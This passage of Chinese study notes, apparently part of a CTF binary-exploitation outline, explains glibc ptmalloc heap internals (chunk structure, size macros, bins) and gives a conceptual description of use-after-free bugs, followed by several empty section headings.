**无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构**。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。

malloc_chunk 的结构：

```cpp
// This struct declaration is misleading (but accurate and necessary). 误导的结构体 仅用作理解
// It declares a "view" into memory allowing access to necessary fields at known offsets from a given base. See explanation below.
// ptmalloc 用 malloc_chunk 表示 mallloc 申请的内存(chunk)
struct malloc_chunk { // default: define INTERNAL_SIZE_T size_t 
  INTERNAL_SIZE_T      prev_size;  // Size of previous chunk (if free). 
  INTERNAL_SIZE_T      size;       // Size in bytes, including overhead.

  struct malloc_chunk* fd;         // double links -- used only if free.
  struct malloc_chunk* bk;

 // Only used for large blocks: pointer to next larger size.
  struct malloc_chunk* fd_nextsize; // double links -- used only if free.
  struct malloc_chunk* bk_nextsize;
};
```

- **prev_size**: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk** 。
- **size**: 该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍(32bit OS: 8B, 64bit OS: 16B)。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示
  - NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。
  - IS_MAPPED，记录当前 chunk 是否是由 **mmap** 分配的。
  - **PREV_INUSE**，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 **1**，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 **0** 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。
- **fd, bk**:  chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下
  - fd 指向下一个（非物理相邻）空闲的 chunk
  - bk 指向上一个（非物理相邻）空闲的 chunk
  - 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理
- **fd_nextsize, bk_nextsize**: 也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。
  - fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
  - bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
  - 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。**这样做可以避免在寻找合适 chunk 时挨个遍历**



INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK:

```cpp
#ifndef INTERNAL_SIZE_T // INTERNAL_SIZE_T might be signed/unsigned, 32/64 bits, the same width as int/long
# define INTERNAL_SIZE_T size_t // 默认与size_t一致，最好定义为unsigned，但size_t是signed
#endif // 64bit OS中可能会被定义为32bit unsigned int, 除非需要16B alignments
// size_t 可能与 INTERNAL_SIZE_T 位宽不等、有符号性不同 // int long 可能为32/64bit 也可能等位宽
// 建议将INTERNAL_SIZE_T提升至unsigned long后作对比，但注意unsigned到更宽的long不是sign-extend
#define SIZE_SZ (sizeof (INTERNAL_SIZE_T)) // The corresponding word size.
// 一般 SIZE_SZ = 4 in 32bit OS; 8 in 64bit OS
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) // The corresponding bit mask value.
```

> 一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数

**称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。**

```python
# 一个已经分配的 chunk 的 mem layout
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # chunk header ↓
        |             Size of previous chunk, if unallocated (P clear)  | 
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P| # 记录大小
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ # chunk header ↑
        |             User data starts here...                          . # user data
        .                                                               . # user data...
        .             (malloc_usable_size() bytes)                      .
next    .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1| # 1: 前一 chunk 块被分配
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

被释放的 chunk 被记录在链表中（可能是循环双向链表 / 单向链表）。具体结构如下

```python
# 被释放的 chunk 被记录在链表中（可能是循环双向链表 / 单向链表）。具体结构如下
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`head:  |             Size of chunk, in bytes                     |A|0|P| # 0:
  mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Forward pointer to next chunk in list             |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Back pointer to previous chunk in list            |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Unused space (may be 0 bytes long)                .
        .                                                               .
 next   .                                                               |
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`foot:  |             Size of chunk, in bytes                           |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|0| # 0: 前一 chunk 块未被分配
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小

1. 本身的 size 字段会记录，
2. 它后面的 chunk 会记录。

**一般情况下**，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块

```
一些关于堆的约束:
The three exceptions to all this are:
     1. The special chunk `top' doesn't bother using the
    trailing size field since there is no next contiguous chunk
    that would have to index off it. After initialization, `top'
    is forced to always exist.  If it would become less than
    MINSIZE bytes long, it is replenished.
     2. Chunks allocated via mmap, which have the second-lowest-order
    bit M (IS_MMAPPED) set in their size fields.  Because they are
    allocated one-by-one, each must contain its own trailing size
    field.  If the M bit is set, the other bits are ignored
    (because mmapped chunks are neither in an arena, nor adjacent
    to a freed chunk).  The M bit is also used for chunks which
    originally came from a dumped heap via malloc_set_state in
    hooks.c.
     3. Chunks in fastbins are treated as allocated chunks from the
    point of view of the chunk allocator.  They are consolidated
    with their neighbors only in bulk, in malloc_consolidate.
```

#### chunk MACRO

 chunk 的大小、对齐检查以及一些转换的宏

```c
// mem 指向用户得到的内存的起始位置
// conversion from malloc headers to user pointers, and back
#define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ))
```

```c
// 最小的 chunk 大小 The smallest possible chunk
#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))
```

- offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针

**最小申请的堆内存大小**: 用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍

> **就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些**

```c
// The smallest size we can malloc is an aligned minimal chunk // 最小申请的堆内存大小
// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define MINSIZE                                                                \
    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))
```

**检查分配给用户的内存是否对齐** 2 * SIZE_SZ 大小对齐。

```c
// Check if m has acceptable alignment // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
#define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0)

#define misaligned_chunk(p)                                                    \
    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &       \
     MALLOC_ALIGN_MASK)
```

**请求字节数判断**

```c
//  Check if a request is so large that it would wrap around zero when
//  padded and aligned. To simplify some other code, the bound is made
//  low enough so that adding MINSIZE will also not wrap around zero.
#define REQUEST_OUT_OF_RANGE(req)                                              \
    ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
```

**将用户请求内存大小转为实际分配内存大小**

```c
// pad request bytes into a usable size -- internal version
// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 # SIZE_SZ: 4 in 32bit OS, 8 in 64bit OS
#define request2size(req)                                                      \
    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)                           \
         ? MINSIZE                                                             \
         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

//  Same, except also perform argument check
#define checked_request2size(req, sz)                                          \
    if (REQUEST_OUT_OF_RANGE(req)) {                                           \
        __set_errno(ENOMEM);                                                   \
        return 0;                                                              \
    }                                                                          \
    (sz) = request2size(req);
```

当一个 chunk 处于已分配状态时，它的**物理相邻的下一个 chunk 的 prev_size** 字段必然是**无效**的，故而这个字段就可以被当前这个 chunk 使用。这就是 ptmalloc 中 chunk 间的复用

1. 首先，利用 REQUEST_OUT_OF_RANGE 判断是否可以分配用户请求的字节大小的 chunk。
2. 其次，需要注意的是用户请求的字节是用来存储数据的，即 chunk header 后面的部分。与此同时，由于 chunk 间复用，所以可以使用下一个 chunk 的 prev_size 字段。因此，这里只需要再添加 SIZE_SZ 大小即可以完全存储内容。
3. 由于系统中所允许的申请的 chunk 最小是 MINSIZE，所以与其进行比较。如果不满足最低要求，那么就需要直接分配 **MINSIZE** 字节。
4. 如果大于的话，因为系统中申请的 chunk 需要 **2 * SIZE_SZ** 对齐，所以这里需要加上 MALLOC_ALIGN_MASK 以便于对齐。



### bin

用户释放掉的 chunk 不会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。

ptmalloc 采用分箱式方法对空闲的 chunk 进行管理。首先，它会根据空闲的 chunk 的大小以及使用状态将 chunk 初步分为 4 类：fast bins，small bins，large bins，unsorted bin。每类中仍然有更细的划分，相似大小的 chunk 会用双向链表链接起来。也就是说，在每类 bin 的内部仍然会有多个互不相关的链表来保存不同大小的 chunk。

对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在同一个数组中。这些 bin 对应的数据结构在 malloc_state 中:

```c
#define NBINS 128
//  Normal bins packed as described above
mchunkptr bins[ NBINS * 2 - 2 ];
```

`bins` 主要用于索引不同 bin 的 fd 和 bk。以 32 位系统为例，bins 前 4 项的含义如下

| 含义      | bin1 fd / bin2 prev_size | bin1 bk / bin2 size | bin2 fd / bin3 prev_size | bin2 bk / bin3 size |
| --------- | ------------------------ | ------------------- | ------------------------ | ------------------- |
| bin index | 0                        | 1                   | 2                        | 3                   |

bin2 prev_size与bin1 fd重合，bin2 size与bin1 bk重合。只使用fd, bk索引链表，故该重合部分记录的实际是bin1 fd, bk。也就是说，虽然后一个bin和前一个bin公用部分数据，但是其实记录的仍然是前一个bin的链表数据。通过这样复用节省空间。

> fd 指向下一个（非物理相邻）空闲的 chunk，

数组中的 bin 依次如下

1. 第一个为 **unsorted bin**，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。
2. 索引从 **2** 到 63 的 bin 称为 **small bin**，**同一个 small bin 链表中的 chunk 的大小相同**。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 **2 个机器字长**，即 32 位相差 8 字节，64 位相差 16 字节。
3. small bins 后面的 bin 被称作 **large bins**。large bins 中的每一个 bin 都**包含一定范围内的 chunk**，其中的 chunk **按 fd 指针的顺序从大到小排列**。相同大小的 chunk 同样按照最近使用顺序排列。

此外，上述这些 bin 的排布都会遵循一个原则：**任意两个物理相邻的空闲 chunk 不能在一起**

并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk **先**放到 fast bins 的容器内。**而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。**

bin 通用的宏如下

```c
typedef struct malloc_chunk *mbinptr;

/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i)                                                           \
    (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) -                        \
              offsetof(struct malloc_chunk, fd))

/* analog of ++bin */
//获取下一个bin的地址
#define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1)))

/* Reminders about list directionality within bins */
// 这两个宏可以用来遍历bin
// 获取 bin 的位于链表头的 chunk
#define first(b) ((b)->fd)
// 获取 bin 的位于链表尾的 chunk
#define last(b) ((b)->bk)
```









### Use After Free

> Use After Free, UAF问题 

当一个内存块被释放之后再次被使用，有以下几种情况：

- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，程序崩溃。
- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
- 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

一般所指的 **Use After Free** 漏洞主要是后两种。一般称被释放后没有被设置为NULL的内存指针为**dangling pointer**。







## **IO\_FILE** Utilization



## Race Condition

> 条件竞争

## 整数溢出



## Sandbox Escape

> 沙箱逃逸

## Kernel









---

# Windows Pwn

